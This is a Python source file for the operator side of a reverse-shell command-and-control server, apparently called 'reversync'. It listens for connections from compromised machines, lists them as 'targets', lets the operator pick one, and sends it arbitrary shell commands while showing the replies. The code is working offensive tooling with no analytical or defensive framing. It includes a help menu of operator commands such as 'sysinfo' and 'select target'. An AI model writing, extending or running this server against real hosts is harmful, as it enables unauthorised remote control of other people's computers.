import asyncio
import subprocess
from asyncio import CancelledError, IncompleteReadError
from server_console import ServerConsole


# Server configuration
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 1234


class Targets:
    def __init__(self):
        self.connections = {}
        self.current_target = ''

    def __str__(self) -> str:
        if not self.connections:
            return "[-] No active targets."
        return '\n'.join(f"{i + 1} - {addr}" for i, addr in enumerate(self.connections))

    def delete(self, addr: str):
        if addr in self.connections:
            del self.connections[addr]

    def change_target(self, i=0):
        if list(self.connections):
            self.current_target = list(self.connections)[i]
            return
        self.current_target = ''


async def handle_reverse_shell_connection(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    """
    Handles an active reverse shell session with a connected client.

    Parameters:
    - reader: asyncio.StreamReader — used to read incoming data from the client.
    - writer: asyncio.StreamWriter — used to send data to the client.

    This function maintains a continuous session with a client,
    reading responses until the connection is closed or cancelled.
    """
    client_address = writer.get_extra_info('peername')
    targets.connections[client_address] = writer

    console.output = f"[+] Connection established from {client_address}. Type 'exit' to terminate session."

    try:
        while True:
            # Await response from the client until the "__END__" marker is received
            response = await reader.readuntil(b"__END__")
            # Display the response excluding the "__END__" delimiter
            console.output = response.decode().rstrip("\n__END__")

    except CancelledError as cancel_err:
        console.output = f"\n[-] Connection reader was cancelled: {cancel_err}"

    except IncompleteReadError:
        console.output = "\n[-] Target disconnected unexpectedly."

    finally:
        # Clean up on disconnection
        targets.delete(client_address)

        if client_address == targets.current_target:
            targets.current_target = ''
            console.clear()

        writer.close()
        await writer.wait_closed()
        console.output = "\n[-] Connection closed cleanly."


class Console:
    def __init__(self, shutdown_event: asyncio.Event):
        """
        Initializes the Console class for handling server-side shell interactions.

        Parameters:
        - shutdown_event: asyncio.Event — used to signal server shutdown.
        """
        self.shutdown_event = shutdown_event

    @property
    def current_address(self):
        """Returns the currently selected client address."""
        return targets.current_target

    async def server_console(self):
        """
        Main interactive loop for the server-side console.
        Accepts commands from the operator and sends them to the selected client.
        """
        try:
            while True:
                prompt = f"{self.current_address}@remote-shell > "
                command = await asyncio.get_running_loop().run_in_executor(None, console.b_input, prompt)

                if not command:
                    continue

                command_lower = command.lower()

                if command_lower.startswith("select target "):
                    try:
                        index = int(command.removeprefix("select target "))
                        targets.change_target(index - 1)
                    except ValueError:
                        console.output = "[-] Invalid target index."
                    continue

                elif command_lower == "targets":
                    console.output = f'{targets}'
                    continue

                elif command_lower == "help":
                    console.output = (
                        "Available Commands:\n"
                        " [+] exit                     - Exit from the current target session\n"
                        " [+] sysinfo                  - Retrieve system information from the target machine\n"
                        " [+] targets                  - List all connected machines\n"
                        " [+] select target <int>      - Select a target machine by its index\n"
                        " [+] clear                   - Clear the console output\n"
                        " [+] help                    - Show this help menu\n"
                        " [+] shutdown                - Shut down the server and disconnect all targets\n"
                    )

                    continue

                elif command_lower == "shutdown":
                    console.output = "[-] Closing connection and shutting down server..."
                    break

                elif command_lower == "exit":
                    targets.current_target = ''
                    console.clear()
                    continue

                elif command_lower == "clear":
                    subprocess.call("clear")
                    continue

                # If a client is selected, send the command
                if self.current_address:
                    writer = targets.connections.get(self.current_address)
                    if writer:
                        writer.write(command.encode())
                        await writer.drain()
                    else:
                        console.output = "[-] Selected client is no longer connected."
                elif not targets.connections:
                    console.output = '[-] No client has connected yet...'
                else:
                    console.output = '[-] Select a target using "select target <int>"'

        except CancelledError:
            console.output = '\n[-] Console task cancelled by asyncio.'

        finally:
            # Close all active connections
            for addr in list(targets.connections):
                targets.connections[addr].close()
                await targets.connections[addr].wait_closed()
                targets.delete(addr)

            self.shutdown_event.set()
            targets.current_target = ''
            console.clear()
            console.output = "\n[-] Server console shutdown complete."


async def run_reverse_shell_server():
    """
    Initializes and runs the reverse shell server.
    - Listens for incoming client connections on SERVER_HOST:SERVER_PORT.
    - Starts an interactive server console for operator input.
    - Waits for shutdown signal from the console to gracefully terminate.
    """
    shutdown_event = asyncio.Event()
    server_console = Console(shutdown_event)
    console_task = asyncio.create_task(server_console.server_console())

    # Small delay to ensure console starts before accepting connections
    await asyncio.sleep(0.1)

    try:
        # Try to bind to the specified host and port
        server = await asyncio.start_server(
            handle_reverse_shell_connection,
            SERVER_HOST,
            SERVER_PORT,
            reuse_address=True  # optional but helpful on restarts
        )
    except OSError as e:
        if e.errno == 98:
            console.output = f"[-] Port {SERVER_PORT} is already in use."
        elif e.errno == 13:
            console.output = f"[-] Permission denied: you need elevated privileges to bind to port {SERVER_PORT}."
        else:
            console.output = f"[-] Failed to start server: {e}"
        console_task.cancel()
        return

    console.output = f"[+] Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}"

    try:
        async with server:
            await shutdown_event.wait()  # Wait for the handler to signal shutdown
            console.output = "[-] Shutdown signal received. Closing server..."
            server.close()
            await server.wait_closed()

    except CancelledError as cancel_err:
        if not server.is_serving():
            server.close()
            await server.wait_closed()
        console.output = f"[-] Server shutdown requested. {cancel_err}"

    finally:
        console_task.cancel()
        await asyncio.sleep(0.1)  # Give time for cancel to propagate
        console.exit()
        console.output = "\n[-] Reverse shell server terminated."


# Entry point for starting the reverse shell server

if __name__ == "__main__":
    # Initialize target manager and main console instance
    targets = Targets()
    console = ServerConsole("reversync")  # Consider renaming to `Console` for consistency

    try:
        asyncio.run(run_reverse_shell_server())
    except OSError as e:
        # Handles binding errors and general socket issues
        error_message = e.strerror if e.strerror else str(e)
        console.output = f"[-] OS Error: {error_message}"
    except KeyboardInterrupt:
        # Clean shutdown on Ctrl+C
        console.output = "\n[-] Interrupted by user. Closing connection."
    except Exception as e:
        # Catch-all for unexpected errors
        console.output = f"[-] Unexpected error: {type(e).__name__}: {e}"